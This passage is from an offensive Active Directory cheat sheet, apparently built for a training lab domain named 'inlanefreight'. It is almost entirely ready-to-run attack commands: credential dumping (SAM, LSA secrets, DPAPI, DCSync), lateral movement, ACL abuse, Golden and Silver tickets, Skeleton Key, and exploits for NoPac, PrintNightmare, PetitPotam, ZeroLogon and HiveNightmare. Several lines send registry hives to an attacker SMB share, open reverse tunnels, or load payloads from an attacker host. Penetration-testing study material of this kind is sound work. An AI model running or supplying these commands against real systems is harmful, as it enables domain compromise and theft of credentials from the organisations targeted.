ldapsearch -h 172.16.5.5 -D 'user@inlanefreight.local' -w 'pass' -b "DC=inlanefreight,DC=local" -s sub "(&(objectclass=computer)(ms-mcs-admpwd=*))" ms-mcs-admpwd

# impacket
# (no direct LAPS reader, but can read via LDAP)
# Use ldap3 module
python3 -c "
from ldap3 import Server, Connection, ALL, SUBTREE
s = Server('172.16.5.5', get_info=ALL)
c = Connection(s, user='inlanefreight.local\\user', password='pass', auto_bind=True)
c.search('DC=inlanefreight,DC=local', '(&(objectclass=computer))', search_scope=SUBTREE, attributes=['samaccountname','ms-mcs-admpwd'])
for e in c.entries: print(e)
"
```

## 11.2 - LSA Secrets (Windows Local)

```cmd
# Requires SYSTEM
# Mimikatz
privilege::debug
lsadump::secrets
# Or
token::elevate
vault::cred

# Impacket from Linux
secretsdump.py -sam SAM -system SYSTEM -security SECURITY local
# Or remote
secretsdump.py inlanefreight.local/admin:'pass'@<target>
# Look for:
#   - DPAPI_SYSTEM (decrypts local DPAPI)
#   - NL$KM (cached domain password)
#   - SCM (service credentials in registry)
```

## 11.3 - SAM & SYSTEM (local hashes)

```cmd
# Copy SAM/SYSTEM/SECURITY (reg save, copy, then secretsdump)
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY

# Exfil via SMB
copy C:\Windows\Temp\SAM \\attacker\share\
copy C:\Windows\Temp\SYSTEM \\attacker\share\
copy C:\Windows\Temp\SECURITY \\attacker\share\

# Linux crack
secretsdump.py -sam SAM -system SYSTEM -security SECURITY local > hashes.txt
# Or
impacket-secretsdump -sam SAM -system SYSTEM local
# Crack with hashcat -m 1000 (NTLM)
```

## 11.4 - GPP / SYSVOL cpassword (Legacy — Pre-2014)

```cmd
# Find Groups.xml, Services.xml, ScheduledTasks.xml in SYSVOL
# Decrypt cpassword
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
# Returns: P@$$w0rd

# Linux
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"

# Find automatically
# SMB - any share
smbmap -u user -p pass -d inlanefreight.local -H 172.16.5.5 -R 'SYSVOL' -A Groups.xml
# Or
crackmapexec smb 172.16.5.5 -u user -p pass -M gpp_autologin
# Get-GPPPassword (PowerSploit)
Get-GPPPassword
# Get-GPPScriptsScripts.ps1 (newer)
```

## 11.5 - User Description Field Passwords

```powershell
# PowerView — find user descriptions
Get-DomainUser * | Select-Object samaccountname,description | Format-List
# Or filter for likely passwords
Get-DomainUser * | Where-Object {$_.Description -ne $null} | Select-Object samaccountname,description

# ActiveDirectory
Get-ADUser -Filter * -Properties Description | Where-Object {$_.Description -ne ""} | Select-Object samaccountname,Description
```

## 11.6 - Autologon Credentials (Registry)

```cmd
# On host
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr /i "DefaultUserName DefaultPassword"
# Or
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Autologon"
# Or via PowerView
Get-RegistryAutoLogon -ComputerName <target>
# SharpChrome/SharpDPAPI can decrypt
```

## 11.7 - Wi-Fi Passwords

```cmd
# Local Wi-Fi profiles and passwords (requires local admin)
netsh wlan show profiles
netsh wlan show profile name="<ssid>" key=clear
# Or via SharpWifiGrabber
.\SharpWifiGrabber.exe
```

## 11.8 - Browser Credentials (DPAPI)

```cmd
# SharpChrome (Chrome, Edge, Brave, Opera)
.\SharpChrome.exe
# Output: all saved logins, cookies, etc. (decrypted using DPAPI master keys)

# SharpDPAPI (general DPAPI)
.\SharpDPAPI.exe credentials
.\SharpDPAPI.exe rdg  # RDP credentials
.\SharpDPAPI.exe vaults
.\SharpDPAPI.exe certificates

# Mimikatz
dpapi::chrome
dpapi::cred
# Full Mimikatz dump
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
dpapi::cred /in:C:\path\to\cred
```

## 11.9 - KeePass Databases

```cmd
# Find KeePass DBs
Get-ChildItem -Path C:\ -Recurse -Include *.kdbx
# Or via PowerView
Find-DomainFile -SearchTerms "keepass"
# Crack
keepass2john Database.kdbx > keepass.hash
john keepass.hash --wordlist=rockyou.txt
# Or
hashcat -m 13400 keepass.hash rockyou.txt
```

## 11.10 - Putty Saved Sessions

```cmd
# Registry
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
# Or via PowerView
Get-PuttyHost
# SharpDPAPI or SharpSsh
```

## 11.11 - Scheduled Tasks / Scripts

```cmd
# Local tasks
schtasks /query /fo LIST /v
# Find any tasks running as a service account
schtasks /query | findstr /i "task to run"

# PowerView
Get-DomainGPOComputerLocalGroupMapping -ComputerName <target>
# Or check GPO scripts
Get-DomainGPO | %{ $_.DisplayName; $_.GpoFilePath }
```

## 11.12 - Email + MSSQL Credentials

```cmd
# Outlook saved creds
mimikatz.exe
privilege::debug
sekurlsa::dpapi

# MSSQL
SQL> SELECT name, principal_id, type_desc FROM sys.server_principals
SQL> SELECT name, password_hash FROM sys.sql_logins  # Crack with hashcat -m 1731
# Linked server creds
SQL> EXEC sp_linkedservers
```

## 11.13 - LDAP Credentials Sniffing (LDAPRelayScan)

```bash
# Run on Linux
python3 LDAPRelayScan.py -dc-ip 172.16.5.5 -spn ldap -method LDAPS -ldaps-timeout 5
# Or
python3 LDAPRelayScan.py -u user -p pass -dc-ip 172.16.5.5 -method BOTH
# Returns: LDAP servers with signing not enforced (relayable)

# Then coerce (PetitPotam, PrinterBug) and relay
```

## 11.14 - ADCS / Certificate Theft

```cmd
# Certify.exe (GhostPack)
.\Certify.exe find /vulnerable
.\Certify.exe find /enrolleeSuppliesSubject
# Find templates with ESC1 (enrollee supplies subject, ENROLLEE_SUPPLIES_SUBJECT)
# ESC1 — template allows SAN with arbitrary UPN or DNS, low priv can enroll, manager approval not required

# Certipy (Linux)
certipy find -u user@inlanefreight.local -p 'pass' -dc-ip 172.16.5.5 -stdout
certipy find -u user@inlanefreight.local -p 'pass' -dc-ip 172.16.5.5 -vulnerable -stdout

# Request a cert for a specific user (ESC1)
certipy req -u user@inlanefreight.local -p 'pass' -target 172.16.5.5 -ca 'INLANEFREIGHT-CA' -template 'VulnerableTemplate' -upn 'administrator@inlanefreight.local' -dns 'DC01.inlanefreight.local'

# Then use for auth
certipy auth -pfx administrator.pfx -dc-ip 172.16.5.5
# Or convert to NTLM (with cert hash)
certipy auth -pfx administrator.pfx -dc-ip 172.16.5.5 -username administrator -domain inlanefreight.local
```

## 11.15 - secretsdump (NTDS.dit, SAM, LSA, cached, DPAPI)

```bash
# Full domain dump (requires DA / DC compromise)
secretsdump.py inlanefreight.local/Administrator:'pass'@172.16.5.5
# Outputs:
#   - All user NTLM hashes
#   - All computer NTLM hashes (machine account hashes)
#   - krbtgt hash (if DA)
#   - DPAPI_SYSTEM, NL$KM (LSA secrets)
#   - Cached domain logon hashes

# Just one user
secretsdump.py inlanefreight.local/admin:'pass'@172.16.5.5 -just-dc-user administrator
secretsdump.py inlanefreight.local/admin:'pass'@172.16.5.5 -just-dc-user krbtgt

# Just hashes (no SAM, no LSA)
secretsdump.py inlanefreight.local/admin:'pass'@172.16.5.5 -just-dc

# Just SAM
secretsdump.py inlanefreight.local/admin:'pass'@172.16.5.5 -just-dc-user Administrator

# PwdLastSet for each user
secretsdump.py inlanefreight.local/admin:'pass'@172.16.5.5 -user-status

# PFX export (for ADCS relay chain)
secretsdump.py inlanefreight.local/admin:'pass'@172.16.5.5 -export-pfx
# Saved to C:\Windows\Temp\*.pfx (stealth, leaves no .pfx on share)
```

```cmd
# Windows - mimikatz DCSync (need DRS or DS-Replication rights)
mimikatz.exe
privilege::debug
lsadump::dcsync /user:inlanefreight\krbtgt
lsadump::dcsync /user:inlanefreight\administrator
# Or
lsadump::dcsync /all /csv  # all hashes
```

---

# PHASE 12: PRIVILEGED ACCESS / LATERAL MOVEMENT

> **Trigger:** Have valid domain creds, want to log into specific host (RDP, WinRM, MSSQL, SSH).

## 12.1 - RDP

```bash
# Linux xfreerdp
xfreerdp /v:172.16.5.25 /u:inlanefreight\\wley /p:'Klmcargo2' /dynamic-resolution +clipboard
# Pass-the-Hash RDP
xfreerdp /v:172.16.5.25 /u:inlanefreight\\wley /pth:<nt_hash> /dynamic-resolution
# RestrictedAdmin mode (default in modern Win10/2016+)
# +restricted-admin
xfreerdp /v:172.16.5.25 /u:inlanefreight\\wley /pth:<nt_hash> /restricted-admin

# rdesktop (legacy)
rdesktop -u inlanefreight\\wley -p 'Klmcargo2' 172.16.5.25 -g 90%

# Hydra brute (with prior user list)
crowbar -b rdp -s 172.16.5.25/32 -u wley -c 'Klmcargo2'
# or
hydra -L users.txt -P passwords.txt rdp://172.16.5.25
```

```cmd
# Windows - built-in
mstsc /v:172.16.5.25
# Pass-the-Hash via cmdkey
cmdkey /add:172.16.5.25 /user:wley /pass
# Then mstsc /v:172.16.5.25 (uses stored creds)
# Or mstsc with /restrictedadmin
mstsc /v:172.16.5.25 /restrictedadmin
```

## 12.2 - WinRM / PowerShell Remoting

```bash
# Linux evil-winrm
evil-winrm -i 172.16.5.25 -u inlanefreight\\wley -p 'Klmcargo2'
# Pass-the-Hash (requires RestrictedAdmin or specific config)
evil-winrm -i 172.16.5.25 -u inlanefreight\\wley -H <nt_hash>
# Kerberos auth
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
# (uses ccache)
```

```powershell
# Windows
$secpwd = ConvertTo-SecureString 'Klmcargo2' -AsPlainText -Force
$cred = New-Object PSCredential('inlanefreight\wley', $secpwd)
Enter-PSSession -ComputerName 172.16.5.25 -Credential $cred

# One-liner remote command
Invoke-Command -ComputerName 172.16.5.25 -Credential $cred -ScriptBlock { whoami; ipconfig }

# Persistence: register session config
Register-PSSessionConfiguration -Name "Evil" -Path "C:\Evil\evil.ps1"
# Then connect with
New-PSSession -Name Evil -ComputerName 172.16.5.25 -Authentication Kerberos
```

## 12.3 - MSSQL Admin Abuse

```bash
# Windows auth (use domain creds)
mssqlclient.py inlanefreight.local/wley:'Klmcargo2'@172.16.5.5 -windows-auth

# SQL auth (use guessed/found creds)
mssqlclient.py sa:'<guess>'@172.16.5.5
# If sa blank, try
mssqlclient.py sa:@172.16.5.5

# After login:
SQL> EXEC sp_xp_cmdshell 'whoami'  # Run cmd as SQL service account
SQL> SELECT @@version
SQL> SELECT user_name()  # Current user
SQL> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
# If we can impersonate sa:
SQL> EXECUTE AS LOGIN = 'sa'; EXEC sp_xp_cmdshell 'whoami'
# Linked servers (lateral movement):
SQL> EXEC sp_linkedservers
SQL> SELECT * FROM OPENQUERY([<linked_server>], 'SELECT @@version')
SQL> EXEC ('sp_xp_cmdshell ''whoami''') AT [<linked_server>]

# If sa:
SQL> EXEC xp_dirtree '\\<attacker_ip>\share'  # Coerce auth to attacker
```

## 12.4 - SSH from Windows

```cmd
# OpenSSH client (built-in)
ssh user@172.16.5.25

# plink
plink.exe -ssh user@172.16.5.25 -pw pass

# chisel tunnel
chisel client http://attacker:8080 R:socks

# sshuttle
sshuttle -r user@attacker 0.0.0.0/0 -x <exclusions>
```

## 12.5 - Local Admin Reuse Spray

```bash
# When one host is admin on many others
# 1. Dump local SAM (Phase 11.3)
# 2. Get local admin hash
# 3. Spray to find other hosts with same local admin
netexec smb 172.16.5.0/24 --local-auth -u administrator -H <nt_hash> | grep +

# Stealth PtH via local admin
crackmapexec smb 172.16.5.0/24 -u administrator -H <nt_hash> --exec-method smbexec -x whoami
```

## 12.6 - Kerberos Double Hop Problem

> **Trigger:** `Invoke-Command -ComputerName B -Authentication CredSSP` works around the double-hop issue. Or use `Enter-PSSession` with CredSSP.

```powershell
# Solution 1: CredSSP (least secure — exposes creds to B)
Invoke-Command -ComputerName <target> -Authentication CredSSP -Credential $cred -ScriptBlock { whoami }

# Solution 2: Nested credential (PtH on B, then PSRemote to C from B)
$secpwd = ConvertTo-SecureString '' -AsPlainText -Force
$ptt = New-Object PSCredential('inlanefreight\wley', $secpwd)
Invoke-Command -ComputerName B -Credential $ptt -ScriptBlock { Enter-PSSession C }

# Solution 3: Register a new PSSession configuration with cred
# Solution 4: Use impacket or evil-winrm directly
```

## 12.7 - Lateral Movement Decision Tree
```
Have hash/creds for a target?
├── YES → Try every auth method
│   ├── RDP with /restrictedadmin or PtH
│   ├── WinRM with PtH (Requires UseLogin privilege)
│   ├── SMB (psexec, wmiexec, smbexec, atexec)
│   ├── WMI
│   ├── MSSQL
│   ├── SSH (Linux)
│   └── PSRemoting (with -Authentication CredSSP)
├── NO → LAPS, local admin reuse, find DA sessions
└── NO creds at all → PrintNightmare, NoPac, PetitPotam relay, etc.
```

---

# PHASE 13: ACL ABUSE

> **Trigger:** BloodHound shows interesting ACL edges (GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword, AddMember, AllExtendedRights, GPO abuse, GMSA read, etc.)

## 13.1 - ACL Primer (CRITICAL RIGHTS)

| Right | Extended Right / ACE | What it allows |
|---|---|---|
| **GenericAll** | All | Full control: change password, set SPN, add to group, modify ACL, etc. |
| **GenericWrite** | WriteProperty | Modify any non-protected attr: SPN, description, scriptPath, logon script, etc. |
| **WriteProperty** | Specific attribute | Modify ONE attribute (e.g., serviceprincipalname, scriptpath) |
| **WriteDACL** | WriteDACL | Modify ACL → grant any other right to yourself → chain to GenericAll |
| **WriteOwner** | WriteOwner | Take ownership → as owner, can modify DACL |
| **ForceChangePassword** | User-Force-Change-Password | Reset user's password without knowing current |
| **AddMember** | AddMember | Add self (or any) to a group |
| **AllExtendedRights** | AllExtendedRights | Read LAPS, change password, send-as, receive-as, etc. |
| **ReadLAPSPassword** | ms-Mcs-AdmPwd read | Read LAPS |
| **GenericRead** | GenericRead | Read all properties (description for creds) |
| **ReadGMSAPassword** | GMSAPassword read | Read GMSA password |
| **DCSync** | DS-Replication-Get-Changes + Get-Changes-All | Replicate domain hashes |

## 13.2 - Enumerate ACLs

```powershell
# PowerView - find interesting ACLs
Find-InterestingDomainAcl -ResolveGUIDs

# Specific: find rights for our user
$sid = Convert-NameToSid "wley"
Get-DomainObjectACL -ResolveGUIDs -Identity * | ?{$_.SecurityIdentifier -eq $sid}

# Specific: find who has rights over a target
$target_sid = Convert-NameToSid "TargetUser"
Get-DomainObjectACL -ResolveGUIDs -Identity * | ?{$_.IdentityReference -match "TargetUser"}
# Or
Get-DomainObjectACL -ResolveGUIDs -Identity TargetUser
```

## 13.3 - GenericAll → Multiple Sub-attacks

### 13.3.1 - GenericAll on User → ForceChangePassword
```powershell
# PowerView
$cred = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
Set-DomainUserPassword -Identity <target_user> -Credential $cred
# Or
Set-DomainUserPassword -Identity <target_user> -AccountPassword $cred
```

```bash
# Linux
# Use rpcclient
rpcclient -U 'user%pass' <dc_ip>
rpcclient $> setuserinfo2 <target_user> 18 'NewPass123!'  # Password doesn't meet complexity, may fail
# Better: rpcclient 'setuserinfo2' 18 - may not bypass complexity
# Use net rpc password
net rpc password <target_user> 'NewPass123!' -U inlanefreight.local/wley:'Klmcargo2' -S 172.16.5.5

# Or change via RPC
python3 -c "from impacket.dcerpc.v5 import samr, transport; ..."

# Cleanest: Use Set-DomainUserPassword via PowerView from compromised Windows host
```

### 13.3.2 - GenericAll on User → Add SPN → Kerberoast
```powershell
# (covered in Phase 10.3)
Set-DomainObject -Identity <target_user> -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}
Invoke-Kerberoast -Identity <target_user> -OutputFormat hashcat
Set-DomainObject -Identity <target_user> -Clear serviceprincipalname
```

### 13.3.3 - GenericAll on Group → AddMember
```powershell
# PowerView
Add-DomainGroupMember -Identity "Domain Admins" -Members "evil_user"
# Now evil_user is DA
# Cleanup
Remove-DomainGroupMember -Identity "Domain Admins" -Members "evil_user"
```

### 13.3.4 - GenericAll on Computer → RBCD (Resource-Based Constrained Delegation)
```powershell
# 1. Create machine account (or use existing)
New-MachineAccount -MachineAccount "EvilMachine" -Password $(ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force)
# 2. Set RBCD on target computer
Set-DomainObject -Identity <target_computer> -Set @{"msds-allowedtodelegateto"="ldap/dc01.inlanefreight.local","cifs/dc01.inlanefreight.local"}
# Or use PowerView
$computer = Get-DomainComputer <target_computer>
$computer | Set-DomainObject -Set @{"msds-allowedtodelegateto"=$trustees}
# 3. Get TGT for our machine
.\Rubeus.exe tgtdeleg /nowrap
# 4. Get S4U2Self + S4U2Proxy → service ticket
.\Rubeus.exe s4u /user:EvilMachine$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/dc01.inlanefreight.local /ptt
# Now we have a TGS for cifs/dc01 — pass-the-ticket into DC
```

### 13.3.5 - GenericAll on Computer → GPO Abuse (with edit rights)
```powershell
# Need: GenericAll on a GPO linked to OU containing target
# SharpGPOAbuse
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Evil" --Author "Admin" --Command "cmd.exe" --Arguments "/c powershell -enc ..." --GPOName "<gpo_name>"

# Or set RestrictedGroup via PowerView
$Computers = Get-DomainComputer -Filter {samaccountname -eq "<target>"}
$GPO = Get-DomainGPO -Identity "<gpo_guids>"
$GPOPath = "\\<dc>\SYSVOL\<domain>\Policies\{$GPO.GUID}\Machine\Registry.pol"
# Add registry.pol entry for RestrictedGroup to add a user to local admin
```

## 13.4 - GenericWrite → SPN, Scriptpath, Logon Script

```powershell
# Targeted Kerberoast (covered above)

# Set scriptpath (requires user to log on)
Set-DomainObject -Identity <target_user> -Set @{"scriptpath"="\\attacker\share\evil.bat"}

# Set msTSInitialProgram (RDP) — auto-runs on RDP login
Set-DomainObject -Identity <target_user> -Set @{"msTSInitialProgram"="\\attacker\share\evil.exe"}
Set-DomainObject -Identity <target_user> -Set @{"msTSWorkDirectory"="C:\Windows\Temp"}
```

## 13.5 - WriteDACL → Grant Any Right

```powershell
# 1. Add our user as having GenericAll on target
Add-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <our_user> -Rights "All"
# 2. Now we can do anything (chain to ForceChangePassword etc.)
Set-DomainUserPassword -Identity <target> -AccountPassword $new_pwd
# Cleanup
Remove-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <our_user> -Rights "All"
```

## 13.6 - WriteOwner → Take Ownership

```powershell
# 1. Set owner of target to our user
Set-DomainObjectOwner -Identity <target> -OwnerIdentity <our_user>
# 2. Add DACL granting us rights
Add-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <our_user> -Rights "All"
# Now full control
```

## 13.7 - GMSA Password Read

```cmd
# GMSAPasswordReader (or ADModule)
# 1. Find GMSA accounts
Get-ADServiceAccount -Filter *  # Or with BloodHound

# 2. Find who can read password
Get-DomainObject -LDAPFilter "(msDS-AllowedToRetrieveManagedPassword=*)" -Properties samaccountname,msDS-AllowedToRetrieveManagedPassword

# 3. Read the password (must be one of the AllowedToRetrieve)
GMSAPasswordReader.exe --accountname gmsaAccount$ --read
# Or via impacket (if gMSA is set for specific principals)
python3 gMSADumper.py -u user@inlanefreight.local -p pass -d inlanefreight.local
```

## 13.8 - DCSync Rights Abuse

```powershell
# Add our user to have DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=inlanefreight,DC=local" -PrincipalIdentity <our_user> -Rights "DS-Replication-Get-Changes","DS-Replication-Get-Changes-All" -Verbose

# Now DCSync
.\mimikatz.exe
privilege::debug
lsadump::dcsync /user:inlanefreight\krbtgt

# Cleanup
Remove-DomainObjectAcl -TargetIdentity "DC=inlanefreight,DC=local" -PrincipalIdentity <our_user> -Rights "DS-Replication-Get-Changes","DS-Replication-Get-Changes-All"
```

## 13.9 - Shadow Credentials (Whisker / pyWhisker)

> **Trigger:** Have GenericAll/GenericWrite/WriteProperty on `msDS-KeyCredentialLink` over a user/computer.

```bash
# Linux
python3 pywhisker.py -d inlanefreight.local -u user -p 'pass' --target target_user --action add
# Returns: TGT for target_user → use for auth

# Or with certipy
certipy shadow auto -username user@inlanefreight.local -p 'pass' -account target_user
# Adds shadow credential, requests TGT, retrieves NT hash, removes shadow credential

# Cleanup
python3 pywhisker.py -d inlanefreight.local -u user -p 'pass' --target target_user --action list
python3 pywhisker.py -d inlanefreight.local -u user -p 'pass' --target target_user --action remove --device-id <id>
```

```cmd
# Windows Whisker.exe
.\Whisker.exe -d inlanefreight.local -u user -p 'pass' --target target_user add
```

## 13.10 - ACL Abuse Decision Tree
```
BloodHound shows:
├── GenericAll on user → ForceChangePassword, Add SPN+Kerberoast
├── GenericAll on group → Add self to group
├── GenericAll on computer → RBCD, GPO abuse
├── GenericAll on GPO → AddScheduledTask, RestrictedGroup
├── GenericWrite on user → Add SPN+Kerberoast, scriptpath
├── WriteDACL on X → Add self with All → full control
├── WriteOwner on X → Take ownership → write DACL → full control
├── ForceChangePassword on user → Reset password
├── AddMember on group → Add self to group
├── ReadLAPSPassword on computer → Read LAPS
├── GMSAPassword read on gMSA → Read password
├── DCSync rights on domain → DCSync → krbtgt → Golden Ticket
└── GPO abuse → SharpGPOAbuse → code execution
```

---

# PHASE 14: DOMAIN DOMINANCE

## 14.1 - DCSync (need DS-Replication-Get-Changes + Get-Changes-All rights)

```bash
# Linux
secretsdump.py inlanefreight.local/Administrator:'pass'@172.16.5.5
# Just one user
secretsdump.py inlanefreight.local/admin:'pass'@172.16.5.5 -just-dc-user administrator
secretsdump.py inlanefreight.local/admin:'pass'@172.16.5.5 -just-dc-user krbtgt
# With hash
secretsdump.py -hashes :<nt_hash> inlanefreight.local/admin@172.16.5.5
# With Kerberos (ccache)
KRB5CCNAME=admin.ccache secretsdump.py -k -no-pass inlanefreight.local/admin@DC01.INLANEFREIGHT.LOCAL
# Just hashes (no LSA, no SAM)
secretsdump.py inlanefreight.local/admin:'pass'@172.16.5.5 -just-dc
```

```cmd
# Windows - mimikatz
mimikatz.exe
privilege::debug
lsadump::dcsync /user:inlanefreight\krbtgt
lsadump::dcsync /all /csv
# Or
lsadump::dcsync /domain:inlanefreight.local /user:administrator
```

```powershell
# Invoke-DCSync (PowerView-based)
Invoke-DCSync -PWDumpFormat
Invoke-DCSync -PWDumpFormat | Export-Csv hash.csv
# Just one user
Invoke-DCSync -Domain inlanefreight.local -User administrator
# Filter
Invoke-DCSync -PWDumpFormat | Select-String -Pattern "Administrator|krbtgt"
```

## 14.2 - Golden Ticket (after krbtgt hash)

> **Once you have krbtgt hash, you can forge a TGT for ANY user in the domain. Lasts until krbtgt password is changed (twice).**

```bash
# Linux
ticketer.py -nthash <krbtgt_nt_hash> -domain-sid S-1-5-21-... -domain inlanefreight.local -spn krbtgt administrator
# Now we have a golden ticket for administrator
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass -dc-ip 172.16.5.5 inlanefreight.local/administrator@dc01.inlanefreight.local
```

```cmd
# Windows - mimikatz
mimikatz.exe
privilege::debug
lsadump::dcsync /user:inlanefreight\krbtgt  # Get krbtgt hash
# Forge golden ticket
kerberos::golden /user:administrator /domain:inlanefreight.local /sid:S-1-5-21-... /krbtgt:<hash> /ptt
# Or
kerberos::golden /user:administrator /domain:inlanefreight.local /sid:S-1-5-21-... /krbtgt:<hash> /ticket:admin.tck
# Pass the ticket
kerberos::ptt admin.tck
# Now access any service as administrator
```

## 14.3 - Silver Ticket (after service account NTLM hash)

> **Forge a TGS for a specific service. Stealthier than Golden Ticket (no KDC interaction).**

```cmd
# After kerberoasting and cracking svc-account
mimikatz.exe
privilege::debug
kerberos::golden /user:administrator /domain:inlanefreight.local /sid:S-1-5-21-... /target:dc01.inlanefreight.local /service:cifs /rc4:<svc_nt_hash> /ptt
# Now we can access cifs on DC01 as administrator
```

## 14.4 - Skeleton Key (DC shell required)

> **Injects a master password (SkeletonKey) into LSASS on the DC. All user accounts can then be accessed with that password.**

```cmd
# On DC (requires Domain Admin / DC machine admin)
mimikatz.exe
privilege::debug
misc::skeleton
# Now any user can authenticate with the original password OR "mimikatz"
net use \\dc01\C$ /user:administrator mimikatz
```

## 14.5 - Domain Dominance Decision Tree
```
Have Domain Admin / DCSync rights?
├── YES → DCSync
│   ├── Got krbtgt → Golden Ticket (game over)
│   ├── Got all hashes → Lateral movement everywhere
│   └── Got specific service hash → Silver Ticket for that service
├── NO  → ACL abuse (Phase 13)
│   ├── Found DCSync rights on DA path → escalate via ACL
│   └── Found DA path via GPO/RBCD → escalate
└── NO  → Continue attacking (try other chains)
```

---

# PHASE 15: BLEEDING EDGE VULNERABILITIES

## 15.1 - NoPac (CVE-2021-42278 + CVE-2021-42287)

> **Two vulns chained:**
> 1. CVE-2021-42278: sAMAccountName spoofing (rename machine$ to DC, request TGT)
> 2. CVE-2021-42287: Kerberos S4U2Self abuse (impersonate DA)

```bash
# Linux
impacket-GetUserSPNs inlanefreight.local/guest:'pass' -dc-ip 172.16.5.5 -no-preauth-no-pass  # if guest has no pass
# Or
python3 noPac.py inlanefreight.local/guest:'pass' -dc-ip 172.16.5.5 -dc-host dc01 -shell
# Or
python3 noPac.py inlanefreight.local/guest:'pass' -dc-ip 172.16.5.5 -dc-host dc01 -dump
# -shell: drop into DC shell
# -dump: dump SAM/SECURITY/SYSTEM

# Now we have SYSTEM on DC → secretsdump
secretsdump.py -system SYSTEM -sam SAM -security SECURITY -ntds NTDS.dit LOCAL
```

## 15.2 - PrintNightmare (CVE-2021-34527 + CVE-2021-1675)

> **Add a printer driver. Pre-auth RCE on the print spooler service (default enabled on most Win hosts).**

```bash
# Linux
# Check if spooler is enabled
impacket-rpcdump @172.16.5.25 | grep MS-RPRN
# Or
python3 rpcdump.py @172.16.5.25 | grep -i spool
# Or
crackmapexec smb 172.16.5.25 -u user -p 'pass' -M spooler

# RCE (requires domain creds to add driver to a remote print server)
python3 CVE-2021-1675.py inlanefreight.local/user:'pass'@172.16.5.25 '\\attacker\share\evil.dll'
# DLL is loaded by spooler → code execution as SYSTEM

# Sharper
# Mimikatz (Has a built-in module)
mimikatz.exe
privilege::debug
misc::printnightmare
```

## 15.3 - PetitPotam (CVE-2021-36942) + ADCS Relay (ESC8)

> **Coerce authentication from DC to attacker → relay to ADCS HTTP enrollment → certificate for DC machine account → DCSync.**

```bash
# 1. Discover ADCS
certipy find -u user@inlanefreight.local -p 'pass' -dc-ip 172.16.5.5 -stdout | grep -i "ESC8\|Web Enrollment"

# 2. Terminal 1: ntlmrelayx (relay to ADCS, ESC8)
sudo ntlmrelayx.py -t http://172.16.5.45/certsrv/certfnsh.asp -adcs -template DomainController -smb2support

# 3. Terminal 2: PetitPotam coerce DC to authenticate to us
python3 PetitPotam.py -d inlanefreight.local -u user -p 'pass' <attacker_ip> <dc_ip>
# Or
python3 PetitPotam.py <attacker_ip> <dc_ip>  # anonymous

# 4. ntlmrelayx receives the auth → enrolls a cert for DC01$ → returns pfx file
# 5. Use pfx to get TGT for DC01$
python3 gettgtpkinit.py inlanefreight.local/dc01\$ -pfx dc01.pfx -dc-ip 172.16.5.5 dc01.ccache
# 6. DCSync with ccache
python3 secretsdump.py -k -no-pass -dc-ip 172.16.5.5 inlanefreight.local/dc01\$@172.16.5.5 -just-dc-user krbtgt
```

## 15.4 - ZeroLogon (CVE-2020-1472)

> **Netlogon elevation of privilege. Drop machine account password to empty.**

```bash
# Linux
python3 zerologon_tester.py dc01 172.16.5.5  # Test
python3 cve-2020-1472-exploit.py dc01 172.16.5.5  # Exploit
# Now DC machine account password is empty
secretsdump.py -hashes :aad3b435b51404eeaad3b435b51404ee 'inlanefreight.local/dc01$@172.16.5.5' -just-dc
# Restore
python3 restorepassword.py inlanefreight.local/dc01@dc01 -target-ip 172.16.5.5 -hashes :<hash>
```

## 15.5 - MS14-068 (PyKEK)

> **Old vuln. PAC validation flaw. Forge PAC to claim Enterprise Admin.**

```bash
# Linux
ms14-068.py -u wley@inlanefreight.local -p 'Klmcargo2' -s wley_sid -d dc01.inlanefreight.local
# Output: TGT wley@inlanefreight.local.ccache

export KRB5CCNAME=wley@inlanefreight.local.ccache
# Now access any service
wmiexec.py -k -no-pass inlanefreight.local/wley@dc01.inlanefreight.local
# We can also dump krbtgt now
secretsdump.py -k -no-pass inlanefreight.local/wley@dc01.inlanefreight.local
```

## 15.6 - HiveNightmare / SeriousSAM (CVE-2021-36934)

> **Read SAM/SECURITY/SYSTEM as non-admin on Win10 with shadow copies enabled.**

```cmd
# Check
icacls C:\Windows\System32\config\SAM
# Read via shadow copy
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
# Tools
.\HiveNightmare.exe
.\SeriousSAM.exe
# Or via 7zip (read shadow copy)
7z e -oC:\loot \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
# Then secretsdump
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY local
```

## 15.7 - SharpEfsPotato / PrintSpoofer / GodPotato → Service Account → SYSTEM

```cmd
# PrintSpoofer
.\PrintSpoofer64.exe -i -c cmd
# Or via SharpEfsPotato
.\SharpEfsPotato.exe -p C:\Windows\System32\cmd.exe
# Or GodPotato
.\GodPotato.exe -cmd "C:\Windows\System32\cmd.exe /c whoami"
```

## 15.8 - Coercion Tools Catalog (used with NTLM relay)
```
- PetitPotam (EfsRpcOpenFileRaw / EfsRpcEncryptFileSrv) - MS-EFSRPC
